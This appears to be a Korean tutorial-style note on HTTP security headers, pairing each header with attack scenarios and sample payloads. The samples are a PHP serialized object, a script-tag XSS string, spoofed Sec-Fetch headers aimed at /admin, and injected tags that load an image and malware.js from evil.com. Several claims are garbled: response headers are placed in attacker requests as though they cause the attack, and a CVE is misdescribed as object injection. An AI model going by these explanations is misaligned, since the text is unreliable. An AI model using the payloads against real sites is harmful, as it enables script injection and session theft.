### 1. `X-Powered-By` 헤더 노출

`X-Powered-By` 헤더에 서버의 기술 스택이 노출되면, 공격자는 해당 기술에 특화된 취약점을 알고 이를 **악의적인 요청**에 포함시킬 수 있습니다. 예를 들어, `X-Powered-By: PHP/7.4.3`가 노출되면 PHP에서 발생할 수 있는 특정 취약점을 악용할 수 있습니다.

#### **공격 시나리오**: PHP 객체 주입 취약점

**1. 요청 보내기**:

* 공격자는 **PHP 7.4.3**에 존재하는 객체 주입 취약점(CVE-2020-7066)을 이용할 수 있습니다. 이 취약점은 서버가 특정 객체를 `unserialize()`할 때 발생할 수 있습니다.
* 공격자는 `unserialize()`를 호출하는 서버의 **입력값**에 악의적인 객체를 전달하는 페이로드를 보낼 수 있습니다.

**2. 페이로드**:

```php
O:8:"TestClass":1:{s:4:"test";s:9:"malicious";}
```

**3. 요청 예시**:

```http
POST /example_endpoint HTTP/1.1
Host: victim.com
X-Powered-By: PHP/7.4.3
Content-Type: application/x-www-form-urlencoded

data=O:8:"TestClass":1:{s:4:"test";s:9:"malicious";}
```

---
### 2. `X-XSS-Protection: 0` 노출

`X-XSS-Protection` 헤더가 **0**으로 설정되어 있으면, 브라우저의 XSS 보호 기능이 비활성화됩니다. 이는 XSS 공격이 성공할 가능성이 높다는 의미입니다.

#### **공격 시나리오**: DOM 기반 XSS 공격

**1. 요청 보내기**:

* 공격자는 사용자가 입력할 수 있는 필드(예: 댓글, 검색창 등)에 **악성 스크립트**를 삽입할 수 있습니다.
* 예를 들어, 사용자가 검색창에 악성 스크립트를 삽입하면 이를 실행하여 **세션 하이재킹**이나 **정보 탈취** 등의 공격을 할 수 있습니다.

**2. 페이로드**:

```html
<script>alert('XSS Attack!');</script>
```

**3. 요청 예시**:

```http
GET /search?q=<script>alert('XSS Attack!');</script> HTTP/1.1
Host: victim.com
X-XSS-Protection: 0
```

브라우저에서 **X-XSS-Protection: 0**이 설정되어 있으면, XSS 필터링이 작동하지 않아 이 **악성 스크립트**가 실행됩니다.

---

### 3. **X-Response-Time** 노출

`X-Response-Time` 헤더가 노출되면, 공격자는 **응답 시간 차이**를 분석하여 **서버의 동작**을 유추할 수 있습니다. 예를 들어, 로그인 요청 시 **정상 계정**과 **비정상 계정**에 대해 다른 응답 시간을 보낼 수 있습니다. 이 정보를 통해 **무차별 대입 공격**을 시도할 수 있습니다.

#### **공격 시나리오**: 로그인 우회 (타이밍 공격)

**1. 요청 보내기**:

* 공격자는 가짜 계정과 실제 계정에 대한 로그인 요청을 반복하여 응답 시간을 비교합니다.
* 정상 계정에 대해서는 빠른 응답을, 비정상 계정에 대해서는 **느린 응답**을 보낸다면 공격자는 이를 통해 유효한 계정을 식별할 수 있습니다.

**2. 요청 예시** (로그인 시도):

```http
POST /login HTTP/1.1
Host: victim.com
X-Response-Time: 150ms
Content-Type: application/x-www-form-urlencoded

username=attacker&password=wrongpassword
```

**3. 반복적인 로그인 시도**:

* 공격자는 위의 로그인 요청을 **다양한 사용자 이름과 비밀번호** 조합으로 반복하여 보내면서 `X-Response-Time` 값의 차이를 분석합니다. 정상 계정에 대한 로그인 요청은 **빠른 응답**, 잘못된 계정에 대한 로그인 요청은 **느린 응답**을 받게 될 수 있습니다.
* 이 정보를 통해 **유효한 계정을 확인**하고 **비밀번호를 추측**할 수 있습니다.

---
## 4. `Sec-CH-*` 헤더 (Client Hints)

### 🔹 용도

`Sec-CH-*`는 **Client Hints**라는 기술의 일부로, 클라이언트(브라우저)의 정보를 서버에 전달할 때 사용돼. 예를 들면:

* `Sec-CH-UA`: 사용자 에이전트(브라우저 정보)
* `Sec-CH-UA-Mobile`: 모바일 여부
* `Sec-CH-UA-Platform`: 플랫폼(OS)

### 🔹 공격 가능성

이 헤더 자체로 공격을 하기보다는 **사용자 정보 수집**, **클라이언트 판단 우회**에 쓰일 수 있어. 서버가 특정 조건(모바일, 특정 브라우저 등)에 따라 응답을 다르게 할 경우, 이걸 조작해서 우회할 수 있음.

### ✅ 페이로드 예시

```http
GET / HTTP/1.1
Host: victim.com
Sec-CH-UA: "Not A;Brand";v="99", "Chromium";v="114"
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: "Android"
```

이렇게 요청하면, 서버는 **Android 모바일 Chrome**에서 요청한 것으로 판단할 수 있음. 이를 통해 특정 콘텐츠에 접근할 수도 있음.

---

## 5. `Sec-Fetch-*` 헤더

### 🔹 용도

브라우저가 요청의 **출처와 목적**을 설명해주는 보안 관련 헤더들.

* `Sec-Fetch-Site`: same-origin, same-site, cross-site
* `Sec-Fetch-Mode`:


### 🔹 공격 가능성

웹 방화벽이나 서버가 `Sec-Fetch-Site: cross-site` 같은 헤더를 기반으로 **요청 차단**할 수 있어. 하지만 이걸 조작하면 우회 가능.

### ✅ 페이로드 예시

```http
GET /admin HTTP/1.1
Host: target.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Sec-Fetch-User: ?1
```

이렇게 조작하면, 마치 같은 사이트에서 발생한 일반적인 사용자 요청처럼 보이게 할 수 있어.

---

## 6. `Strict-Transport-Security` 헤더 (HSTS)

### 🔹 용도

`Strict-Transport-Security`는 브라우저에게 **이 사이트는 HTTPS로만 접속해야 한다**고 지시하는 보안 헤더야. 이를 설정하면 브라우저는 이후부터 HTTP 접속을 **자동으로 HTTPS로 리디렉션**하고, HTTP 접속을 아예 차단하기도 해.

> 📘 주요 필드 예시:
>
> * `max-age`: 적용 기간 (초 단위)
> * `includeSubDomains`: 서브도메인까지 적용
> * `preload`: 브라우저 preload 목록에 포함

### 🔹 공격 가능성

이 헤더가 없으면, 사용자가 HTTP로 접속했을 때 \*\*중간자 공격(MITM)\*\*이 가능해져. 공격자가 HTTP 요청을 가로채서 악성 스크립트를 삽입하거나, 가짜 페이지로 유도할 수 있어.

### ✅ 시나리오 예시

1. 사용자가 `http://example.com`에 접속 (HTTPS 입력 안 함)
2. 공공 Wi-Fi에 있던 공격자가 해당 요청을 **가로채고 조작**
3. 사용자는 공격자가 만든 가짜 로그인 페이지를 보게 됨
4. 입력된 로그인 정보는 공격자에게 전송됨

### ✅ 방어용 설정 예시

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

> 📌 HSTS는 HTTPS에서만 작동하므로, HTTP 접속은 리디렉션 또는 차단되어야 해.

---

## 7. `Referrer-Policy` 헤더

### 🔹 용도

`Referrer-Policy`는 브라우저가 **링크나 리소스 요청 시 '참조 페이지 정보(Referrer)'를 얼마나 포함할지**를 제어하는 헤더야. 이 정보를 통해 다른 사이트에 사용자의 이동 경로나 민감한 URL이 노출될 수 있어.

> 예:
> `Referrer-Policy: strict-origin-when-cross-origin`
> → 같은 사이트 내에서는 전체 Referrer 전송, 다른 도메인으로는 도메인만 전송

### 🔹 공격 가능성

이 헤더가 없으면, 외부로 요청이 전송될 때 \*\*전체 URL 정보(쿼리 파라미터 포함)\*\*가 Referrer에 담겨서 유출될 수 있어. 이걸 통해 공격자는 **민감한 정보 수집, 세션 탈취, 멀웨어 배포 추적** 등을 할 수 있음.

### ✅ 시나리오 예시

1. 사용자가 아래 URL에 접속:

   ```
   https://bank.com/transfer?to=attacker&amount=1000
   ```
2. 페이지 안에 외부 리소스가 삽입돼 있음:

   ```html
   <img src="http://evil.com/track.png">
   ```
3. 브라우저는 evil.com에 요청을 보내면서 Referrer에 **전체 URL**을 포함시킴
4. 공격자는 로그를 통해 민감한 정보를 확보함 (계좌번호, 금액 등)

### ✅ 방어용 설정 예시

```http
Referrer-Policy: strict-origin-when-cross-origin
```

> 📌 `no-referrer`, `strict-origin`, `same-origin` 등 여러 값이 있으며, 목적에 따라 선택하면 돼.

---

## 8. `Permissions-Policy` 헤더 (기존 `Feature-Policy`)

### 🔹 용도

`Permissions-Policy`는 브라우저에서 특정 \*\*기능(API)\*\*의 사용을 허용하거나 제한할 수 있는 보안 헤더야.
예를 들어 웹사이트에서 카메라, 마이크, 위치 정보, 풀스크린, USB 접근 등을 **특정 도메인만 사용 가능하게** 제한할 수 있어.

> 📘 주요 기능 예시:
>
> * `camera`
> * `microphone`
> * `geolocation`
> * `fullscreen`
> * `usb`
> * `accelerometer`

### 🔹 공격 가능성

이 헤더가 없으면 웹사이트 내의 iframe이나 악성 스크립트가 **민감한 기능을 무단으로 사용하는 것을 제한할 수 없어**. 예를 들어, 악성 iframe이 사용자의 위치 정보를 수집하거나, 카메라를 열 수도 있어.

### ✅ 페이로드 예시

```http
Permissions-Policy: geolocation=(self), microphone=()
```

→ 위치 정보는 현재 사이트만 허용, 마이크는 모두 차단.

### ✅ 시나리오 예시

1. 공격자가 iframe을 삽입해 사이트에 악성 코드 포함
2. 브라우저가 별다른 제약 없이 `geolocation` API 사용 허용
3. 사용자 위치가 공격자 서버로 전송됨

---

## 9. `X-Content-Type-Options` 헤더

### 🔹 용도

이 헤더는 브라우저에게 **서버가 지정한 콘텐츠 타입(MIME type)을 그대로 따르도록 강제**하는 역할을 해.
주로 **MIME 스니핑(MIME Sniffing)** 공격을 방지하기 위해 사용돼.

> 📘 일반적으로 아래와 같이 사용함:

```http
X-Content-Type-Options: nosniff
```

### 🔹 공격 가능성

이 헤더가 없으면, 브라우저가 파일의 내용을 검사해 MIME 타입을 추측해서 다르게 처리할 수 있어. 이걸 악용해 HTML이 아닌 파일을 **HTML로 오인하게 하여 XSS 공격**을 유도할 수 있어.

### ✅ 시나리오 예시

1. 서버가 파일을 `text/plain`으로 응답했지만, 내용에 `<script>` 태그 포함
2. 브라우저가 `text/html`로 오인하고 **스크립트 실행**
3. 결과적으로 XSS 공격 성공

---

## 10. `Content-Security-Policy` 헤더 (CSP)

### 🔹 용도

`Content-Security-Policy`는 사이트가 **어디로부터 어떤 종류의 리소스를 로드할 수 있는지**를 명확히 정의하는 보안 정책 헤더야.
주로 **XSS 공격 방지**, **외부 리소스 제한**, **인라인 스크립트 차단** 등의 목적에 사용돼.

> 📘 예시 정책:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com
```

→ 모든 기본 리소스는 현재 도메인만 허용, 스크립트는 self + Google API만 허용

### 🔹 공격 가능성

이 헤더가 없으면 웹 페이지가 **모든 외부 도메인에서 스크립트, 이미지, 스타일 등 리소스를 불러올 수 있어**. 이를 통해 공격자는 악성 JS를 삽입해 **XSS, 세션 탈취, 멀웨어 유포** 등을 할 수 있어.

### ✅ 시나리오 예시

1. 공격자가 댓글 기능 등에 `<script src="http://evil.com/malware.js"></script>` 삽입
2. 사이트에 CSP가 없어서 브라우저가 해당 스크립트를 실행
3. 사용자 세션 쿠키가 공격자에게 전송됨

---
